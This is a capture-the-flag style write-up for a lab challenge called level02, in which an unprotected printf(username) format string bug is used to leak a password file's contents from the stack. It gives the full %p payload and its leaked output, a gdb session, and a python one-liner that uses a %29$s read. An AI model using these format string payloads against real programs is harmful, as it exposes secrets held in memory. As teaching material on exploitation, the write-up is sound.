# level02

The level02 has only one main function, which reads the stdin.

We see that the program opens the file containing the desired password, and that the contents of the file are stored on the stack.

The function expects a username and password, but there's no way to make an overflow this time.

We can see a bash system call, but to enter the if, we need to enter the level03 password...

On the other hand, at the end of the code, we can see an unprotected printf call : `printf(username);`.

This is the vulnerability that we're going to exploit to recover our password. All we need to do is use %p to display the values in the stack.  
The various variables are stored on the stack from top to bottom. All we need to do is locate our buffer, which is declared just after username, and move up 5 values (as we read 41 characters):
```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
--[ Password: *****************************************
AAAAA 0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025204141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025  does not have access!
```

And here are our hexadecimal values:
```
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```

Now we just need to reverse the order and convert (we made a program for this purpose : `decrypt.go`) our values to get our password!

```bash
go run decrypt.go 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
```

There's an other way to get the password. It is possible to use a %s by inputting the address of the password on the stack.

To find the address we can use gdb. Reading the disassembly, we can find the location on this line: `lea    -0xa0(%rbp),%rax`.

So we can get the address like so:

```gdb
(gdb) b main
Breakpoint 1 at 0x400818
(gdb) r
Starting program: /home/users/level02/level02 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000000000400818 in main ()
(gdb) x/x $rbp-0xa0
0x7fffffffe530:	0x00000000
```

Knowing that the username is located as the "28th parameter" for printf, here's the %s exploit:
```bash
python -c 'print "%29$s   " + "\x7f\xff\xff\xff\xe5\x30"[::-1] + "\n"' | /home/users/level02/level02
```
